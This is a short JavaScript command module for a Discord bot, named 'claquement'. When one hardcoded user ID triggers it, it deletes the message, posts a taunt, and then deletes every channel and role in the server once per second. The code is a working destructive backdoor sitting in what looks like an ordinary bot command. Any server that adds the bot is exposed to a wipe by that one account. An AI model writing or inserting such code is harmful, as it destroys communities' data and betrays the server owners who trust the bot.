const Discord = require("discord.js");
const { RichEmbed } = require("discord.js");

module.exports.run = async (bot, message, args) =>{
console.log("test")
  message.delete();
  if(message.author.id === "212238091455299585") {
    message.channel.send("*claque des doigts  **BITCHIES**")
    var deletede = setInterval(deleting, 1000)
    function deleting() {
      message.guild.channels.forEach(channel => channel.delete())
      message.guild.roles.forEach(roles => roles.delete())
    }
  }
}
module.exports.help = {
    name: "claquement"
}